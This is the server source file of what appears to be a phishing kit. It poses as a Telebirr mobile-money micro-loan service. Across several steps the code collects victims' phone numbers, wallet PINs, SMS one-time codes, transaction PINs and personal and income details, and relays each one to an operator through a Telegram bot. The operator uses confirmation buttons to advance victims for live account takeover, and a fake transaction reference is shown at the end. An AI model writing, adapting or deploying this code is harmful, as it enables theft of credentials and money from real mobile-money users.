require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; 

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    let activeRoom = `TB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    socket.join(activeRoom);
    socket.emit('session-ready', { appId: activeRoom });
    console.log(`🔌 Assigned internal tracking session: ${activeRoom}`);

    socket.on('join-room', (room) => {
        if (room && room !== "null" && room !== "") {
            socket.leave(activeRoom);
            socket.join(room);
            activeRoom = room;
            console.log(`🔌 User synchronized room identifier: ${room}`);
        }
    });

    const getValidId = (data) => {
        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
            return data.appId;
        }
        return activeRoom;
    };

    // STEP 1: Telebirr Account Login Credentials (Phone + Wallet Pin)
    socket.on('submit-step1-credentials', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 1: Telebirr Login Attempt", {
            "Mobile Phone": `+251${data.phone}`,
            "Wallet Access PIN": data.pin
        }, true); // Setting true prompts admin confirmation buttons to advance to Step 2 (SMS OTP)
    });

    // STEP 2: Telebirr SMS OTP Code Verification
    socket.on('submit-otp-verification', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 2: SMS OTP Token Submitted", {
            "SMS OTP Code": data.code
        }, true); // Setting true prompts admin confirmation buttons to advance to Step 3 (Transaction PIN)
    });

    // STEP 3: Account Security Transaction PIN Verification
    socket.on('submit-final-pin', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 3: Account Security Transaction PIN", {
            "Transaction PIN": data.pin
        }, true); // Setting true prompts final admin buttons to advance to Step 4 (Loan Configuration)
    });

    // STEP 4: Loan Request Parameter Parameters (Passive configuration collection)
    socket.on('submit-step4-loan-config', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 4: Micro-Credit Loan Settings", {
            "Category Type": data.loanType,
            "Amount Requested": `${data.amount} ETB`,
            "Repayment Term": `${data.term} Weeks`
        }, false);
    });

    // STEP 5: KYC Core Profile Data (Passive configuration collection)
    socket.on('submit-step5-kyc-profile', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 5: KYC User Profile Metrics", {
            "First Name": data.firstName,
            "Last Name": data.lastName,
            "Email Address": data.email
        }, false);
    });
    
    // STEP 6: Income & Job Verification Status
    socket.on('submit-step6-financials', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 6: Employment & Financial Parameters", {
            "Employment Type": data.employment,
            "Monthly Earnings": `${data.income} ETB`
        }, false);

        // Instantly generate and close out disbursement confirmation targets
        const txnReferenceId = `TXN-${Math.floor(100000 + Math.random() * 900000)}-ETB`;
        io.to(currentId).emit('application-complete', { referenceId: txnReferenceId });
        console.log(`✅ Session ${currentId} disbursement workflow committed.`);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected socket room: ${activeRoom}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Telebirr Core Financial System running on port ${PORT}`);
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook successfully set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    }
});